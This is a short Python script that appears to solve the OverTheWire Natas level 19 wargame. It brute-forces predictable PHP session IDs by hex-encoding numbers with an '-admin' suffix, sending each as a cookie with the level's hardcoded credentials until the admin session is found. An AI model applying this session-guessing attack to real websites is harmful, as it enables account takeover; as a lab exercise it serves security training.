import requests

auth = ('natas19','8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
url  = 'http://natas19.natas.labs.overthewire.org/'


for i in range(200,640):    
    hash=''
    print("Testing: " + str(i))
    
    for j in str(i) : 
        hash+= hex(ord(str(j)))
        hash=hash.replace('0x', '')
   
    hash+='2d61646d696e' 
    cook={'PHPSESSID': hash}
    res = requests.get(url,auth=auth,cookies=cook)
    if 'regular user' not in res.text:
        print("We found it:"+str(i))
        print(res.text)
        break

